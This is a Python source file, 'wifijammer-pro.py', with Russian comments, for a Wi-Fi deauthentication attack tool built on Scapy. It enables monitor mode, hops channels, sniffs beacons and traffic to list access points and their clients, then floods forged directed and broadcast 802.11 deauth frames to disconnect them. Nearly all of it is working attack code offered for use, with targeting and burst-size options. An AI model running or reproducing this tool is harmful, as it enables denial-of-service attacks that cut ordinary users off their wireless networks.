#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
"""
wifijammer-pro.py — Современный, мощный инструмент для Wi-Fi деаутентификации.
Поддержка: Python 3.7–3.13, monitor mode, channel hopping, targeted deauth, stats.
"""

import fcntl
import struct
import socket
import argparse
import logging
import sys
import os
import re
import time
from signal import SIGINT, signal
from subprocess import Popen, PIPE
from threading import Thread, Lock
from scapy.all import *
from typing import List, Tuple, Optional, Set

# === Настройка логирования Scapy ===
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0  # Не выводить сообщения Scapy

# === Цвета для консоли ===
W = '\033[0m'   # White
R = '\033[31m'  # Red
G = '\033[32m'  # Green
O = '\033[33m'  # Orange
B = '\033[34m'  # Blue
T = '\033[93m'  # Tan
P = '\033[35m'  # Purple

# === Глобальные переменные ===
clients_APs: List[Tuple[str, str, str, str]] = []  # client, ap, channel, ssid
APs: List[Tuple[str, str, str]] = []              # bssid, channel, ssid
deauth_count: int = 0
lock = Lock()
deauth_lock = Lock()
monitor_on = False
monchannel = "1"
first_pass = True
injection_working = False


# === Аргументы командной строки ===
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="wifijammer-pro: Advanced Wi-Fi Deauthentication Tool",
        epilog="Example: sudo python3 wifijammer-pro.py -i wlan0mon -p 5 --world"
    )
    parser.add_argument("-i", "--interface", help="Monitor interface (e.g. wlan0mon)")
    parser.add_argument("-c", "--channel", help="Fix on channel (e.g. -c 6)")
    parser.add_argument("-s", "--skip", nargs='*', default=[], help="Skip MACs")
    parser.add_argument("-a", "--accesspoint", nargs='*', default=[], help="Target SSID or BSSID")
    parser.add_argument("-m", "--maximum", type=int, help="Max client-AP pairs to track")
    parser.add_argument("-n", "--noupdate", action='store_true', help="Don't clear list after -m")
    parser.add_argument("-p", "--packets", type=int, default=1, help="Deauth packets per burst (default: 1)")
    parser.add_argument("-t", "--timeinterval", type=float, default=0.00001, help="Interval between packets")
    parser.add_argument("-d", "--directedonly", action='store_true', help="Skip broadcast deauths")
    parser.add_argument("--world", action='store_true', help="Use 13 channels (EU/Asia)")
    parser.add_argument("--dry-run", action='store_true', help="Simulate, don't send packets")
    parser.add_argument("--quiet", action='store_true', help="Minimal output")
    parser.add_argument("--verbose", action='store_true', help="Show all debug info")
    return parser.parse_args()


# === Работа с интерфейсами ===
def iwconfig() -> Tuple[List[str], List[str]]:
    """Возвращает список monitor и managed интерфейсов"""
    monitors, interfaces = [], []
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=PIPE)
        out, _ = proc.communicate()
        for line in out.decode().split('\n'):
            if not line.strip() or re.match(r'lo|eth|usb|wwan', line):
                continue
            if 'IEEE 802.11' in line:
                iface = line.split()[0]
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                else:
                    interfaces.append(iface)
    except Exception as e:
        sys.exit(f"[{R}-{W}] Failed to run iwconfig: {e}")
    return monitors, interfaces


def get_mon_iface(args) -> str:
    """Получить или создать интерфейс в monitor mode"""
    global monitor_on
    monitors, interfaces = iwconfig()

    if args.interface:
        if args.interface not in monitors:
            sys.exit(f"[{R}-{W}] Interface {args.interface} is not in monitor mode.")
        monitor_on = True
        return args.interface

    if monitors:
        monitor_on = True
        return monitors[0]

    if not interfaces:
        sys.exit(f"[{R}-{W}] No wireless interfaces found.")

    iface = interfaces[0]
    print(f"[{G}+{W}] Using {G}{iface}{W}, enabling monitor mode...")
    mon_iface = start_mon_mode(iface)
    return mon_iface


def start_mon_mode(interface: str) -> str:
    """Включить monitor mode"""
    mon_iface = f"{interface}mon"
    os.system(f"ip link set {interface} down")
    os.system(f"iw dev {interface} interface add {mon_iface} type monitor")
    os.system(f"ip link set {mon_iface} up")
    time.sleep(1)
    return mon_iface


def remove_mon_iface(mon_iface: str):
    """Вернуть интерфейс в managed mode"""
    if 'mon' in mon_iface:
        base = mon_iface.replace('mon', '')
        os.system(f"iw dev {mon_iface} del")
        os.system(f"ip link set {base} up")
    else:
        os.system(f"ip link set {mon_iface} down")
        os.system(f"iw dev {mon_iface} set type managed")
        os.system(f"ip link set {mon_iface} up")


def get_mac(interface: str) -> str:
    """Получить MAC-адрес интерфейса"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', interface.encode('utf-8')[:15]))
    mac = ':'.join('%02x' % b for b in info[18:24])
    s.close()
    return mac


# === Проверка packet injection ===
def test_injection(mon_iface: str) -> bool:
    """Проверяет, поддерживает ли адаптер отправку пакетов"""
    print(f"[{G}*{W}] Testing packet injection on {G}{mon_iface}{W}...")
    proc = Popen(['aireplay-ng', '-9', mon_iface], stdout=PIPE, stderr=PIPE)
    out, _ = proc.communicate()
    output = out.decode()
    if 'Injection is working!' in output:
        print(f"[{G}+{W}] Injection: {G}WORKING{W}")
        return True
    else:
        print(f"[{R}-{W}] Injection: {R}NOT WORKING{W}")
        print(f"[{R}!{W}] Your adapter may not support packet injection.")
        return False


# === Channel Hopping ===
def channel_hop(mon_iface: str, args):
    global monchannel, first_pass
    channel = 0
    max_chan = 13 if args.world else 11

    while True:
        if args.channel:
            monchannel = args.channel
        else:
            channel = (channel % max_chan) + 1
            monchannel = str(channel)
            if channel == 1:
                first_pass = False
            os.system(f"iw dev {mon_iface} set channel {monchannel}")

        output_status(args, monchannel)
        time.sleep(0.5 if first_pass else 0.05)

        if not first_pass and not args.dry_run:
            deauth(monchannel, args)


# === Deauth атака ===
def deauth(channel: str, args):
    global deauth_count
    pkts = []
    targets = []

    with lock:
        for client, ap, ch, ssid in clients_APs:
            if ch == channel:
                pkts.append(Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth())
                pkts.append(Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth())
                targets.append((client, ap, ssid))

        if not args.directedonly:
            for bssid, ch, ssid in APs:
                if ch == channel:
                    pkts.append(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)/Dot11Deauth())
                    targets.append(("FF:FF:FF:FF:FF:FF", bssid, ssid))

    if pkts:
        sent = 0
        for _ in range(args.packets):
            for pkt in pkts:
                if not args.dry_run:
                    send(pkt, verbose=False)
                sent += 1

        with deauth_lock:
            deauth_count += sent

        # Выводим атакуемые цели
        for client, ap, ssid in targets:
            print(f"[{T}⚡{W}] Deauth: {O}{client}{W} ↔ {O}{ap}{W} ({T}{ssid}{W})")


# === Вывод статуса ===
def output_status(args, channel: str):
    if args.quiet:
        return
    os.system('clear')

    print(f"{P}┌────────────────────────────────────────────────────────────{W}")
    print(f"{P}│{W}  wifijammer-pro {T}v2.0{W} | Interface: {G}{mon_iface}{W} | Chan: {G}{channel}{W}")
    print(f"{P}├────────────────────────────────────────────────────────────{W}")

    if args.dry_run:
        print(f"{P}│{W}  {P}*** DRY RUN MODE ***{W}")
    if args.maximum:
        print(f"{P}│{W}  Max targets: {T}{args.maximum}{W}")

    print(f"{P}│{W}  Packets sent: {T}{deauth_count:,}{W}")

    if not args.quiet and clients_APs:
        print(f"{P}├────────────────────────────────────────────────────────────{W}")
        print(f"{P}│{W}  {'CLIENT':<18} {'AP':<18} {'CH':<2} {'ESSID'}")
        with lock:
            for ca in clients_APs:
                ssid = ca[3] if len(ca) > 3 else "Unknown"
                print(f"{P}│{W}  {O}{ca[0]:<17} {O}{ca[1]:<17} {ca[2]:<2} {T}{ssid}{W}")

    if not args.quiet and APs:
        print(f"{P}├────────────────────────────────────────────────────────────{W}")
        print(f"{P}│{W}  {'AP':<18} {'CH':<2} {'ESSID'}")
        with lock:
            for ap in APs:
                print(f"{P}│{W}  {O}{ap[0]:<17} {ap[1]:<2} {T}{ap[2]}{W}")

    print(f"{P}└────────────────────────────────────────────────────────────{W}")


# === Callback для sniff() ===
def packet_handler(pkt):
    global clients_APs, APs

    if args.maximum and len(clients_APs) >= args.maximum:
        if not args.noupdate:
            with lock:
                clients_APs.clear()
                APs.clear()
        return

    if not pkt.haslayer(Dot11):
        return

    addr1 = pkt.addr1.lower() if pkt.addr1 else ''
    addr2 = pkt.addr2.lower() if pkt.addr2 else ''
    if not addr1 or not addr2:
        return

    # Skip list
    skip_macs = [s.lower() for s in args.skip]
    if addr2 in skip_macs:
        return

    # Target filter
    if args.accesspoint:
        bssids = [a.lower() for a in args.accesspoint if ':' in a]
        ssids = [a for a in args.accesspoint if ':' not in a]
        if pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            if ssid in ssids:
                bssids.append(pkt[Dot11].addr3.lower())
            if addr1 not in bssids and addr2 not in bssids:
                return

    # Noise filter
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:', '01:80:c2:', '01:00:5e:']
    if any(i in addr1 or i in addr2 for i in ignore):
        return

    # Beacon/Probe → AP
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            bssid = pkt[Dot11].addr3.lower()
            channel = ord(pkt[Dot11Elt:3].info)
            chans = list(range(1, 14)) if args.world else list(range(1, 12))
            if channel not in chans:
                return
            if args.channel and str(channel) != args.channel:
                return
            with lock:
                if not any(ap[0] == bssid for ap in APs):
                    APs.append((bssid, str(channel), ssid))
        except:
            pass

    # Data/Control → Client-AP pair
    if pkt.type in [1, 2]:
        with lock:
            if any(addr1 in ca and addr2 in ca for ca in clients_APs):
                return
            ch = monchannel
            ssid = "Unknown"
            for ap in APs:
                if ap[0] in addr1 or ap[0] in addr2:
                    ch = ap[1]
                    ssid = ap[2]
                    break
            clients_APs.append((addr1, addr2, ch, ssid))


# === Обработчик остановки ===
def stop_handler(signum, frame):
    print(f"\n\n[{R}!{W}] Shutting down...")
    if not monitor_on:
        remove_mon_iface(mon_iface)
    os.system("service NetworkManager restart &")
    print(f"[{G}+{W}] NetworkManager restarted.")
    print(f"[{G}+{W}] Total deauth packets sent: {T}{deauth_count:,}{W}")
    sys.exit(0)


# === Главная функция ===
if __name__ == "__main__":
    args = parse_args()

    if os.geteuid() != 0:
        sys.exit(f"[{R}-{W}] Run as root.")

    # Подготовка
    global mon_iface, mon_MAC
    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = get_mac(mon_iface)

    print(f"[{G}*{W}] Monitor MAC: {O}{mon_MAC}{W}")

    # Проверка injection
    injection_working = test_injection(mon_iface)
    if not args.dry_run and not injection_working:
        choice = input(f"[{R}?{W}] Continue anyway? (y/N): ").lower()
        if choice != 'y':
            sys.exit(1)

    # Запуск
    hop_thread = Thread(target=channel_hop, args=(mon_iface, args), daemon=True)
    hop_thread.start()

    signal(SIGINT, stop_handler)

    print(f"\n[{G}+{W}] Starting attack on {G}{mon_iface}{W}... Press Ctrl+C to stop.")
    time.sleep(2)

    try:
        sniff(iface=mon_iface, prn=packet_handler, store=0)
    except KeyboardInterrupt:
        stop_handler(None, None)
    except Exception as e:
        print(f"[{R}!{W}] Sniffing error: {e}")
        stop_handler(None, None)